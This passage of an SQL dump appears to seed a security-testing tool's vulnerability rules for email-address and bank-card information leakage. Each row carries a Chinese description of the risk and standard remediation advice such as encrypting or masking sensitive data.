5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, '车牌号泄露', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (61, 1, '邮箱泄露', 5, 'enable', 1764061220, '邮箱泄露', '邮箱信息泄露是指个人或组织的电子邮件地址在未经授权的情况下被公开或泄露给第三方，可能导致垃圾邮件、网络钓鱼攻击、身份盗窃等电子邮件相关风险。这种泄露可能被滥用来发送恶意邮件、欺诈信息或用于不法用途，对电子邮件用户的隐私和安全构成潜在威胁。因此，保护电子邮件地址的隐私对于防范电子邮件相关风险至关重要。', '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, NULL, '邮箱信息泄露是指个人或组织的电子邮件地址在未经授权的情况下被公开或泄露给第三方，可能导致垃圾邮件、网络钓鱼攻击、身份盗窃等电子邮件相关风险。这种泄露可能被滥用来发送恶意邮件、欺诈信息或用于不法用途，对电子邮件用户的隐私和安全构成潜在威胁。因此，保护电子邮件地址的隐私对于防范电子邮件相关风险至关重要。', NULL, '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, '邮箱泄露', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (62, 1, '银行卡泄露', 1, 'enable', 1764061221, '银行卡泄露', '银行卡信息泄露是指个人或组织的银行卡号码以及相关敏感支付信息在未经授权的情况下被公开或泄露给第三方，从而导致个人金融隐私受到威胁的一种严重漏洞。\n一旦银行卡信息被泄露，攻击者可能会利用这些信息进行各种恶意活动，包括非法购物、金融诈骗、身份盗窃以及非法转账。例如，攻击者可以使用被泄露的卡号进行在线购物或实际购买商品和服务，从而导致卡主账户资金被盗或者欠款增加。此外，银行卡信息的泄露还可能导致信用评分下降，对卡主的信用记录产生负面影响。\n为了保护银行卡信息的安全，卡主应当采取一系列预防措施，包括定期检查账单，设置强密码和PIN码，不随意分享卡号等敏感信息，以及在使用卡时保持警惕。同时，金融机构和支付服务提供商也应加强安全措施，监测不正常的交易活动，以及提供卡主保护其账户免受不当使用的手段。\n对于银行卡信息的不当泄露，相关法律法规应该加以约束和惩罚，以维护金融隐私和金融系统的安全性。这样可以帮助减少银行卡信息泄露对个人和社会的潜在风险。', '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, NULL, '银行卡信息泄露是指个人或组织的银行卡号码以及相关敏感支付信息在未经授权的情况下被公开或泄露给第三方，从而导致个人金融隐私受到威胁的一种严重漏洞。\n一旦银行卡信息被泄露，攻击者可能会利用这些信息进行各种恶意活动，包括非法购物、金融诈骗、身份盗窃以及非法转账。例如，攻击者可以使用被泄露的卡号进行在线购物或实际购买商品和服务，从而导致卡主账户资金被盗或者欠款增加。此外，银行卡信息的泄露还可能导致信用评分下降，对卡主的信用记录产生负面影响。\n为了保护银行卡信息的安全，卡主应当采取一系列预防措施，包括定期检查账单，设置强密码和PIN码，不随意分享卡号等敏感信息，以及在使用卡时保持警惕。同时，金融机构和支付服务提供商也应加强安全措施，监测不正常的交易活动，以及提供卡主保护其账户免受不当使用的手段。\n对于银行卡信息的不当泄露，相关法律法规应该加以约束和惩罚，以维护金融隐私和金融系统的安全性。这样可以帮助减少银行卡信息泄露对个人和社会的潜在风险。', NULL, '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, '银行卡泄露', 1);
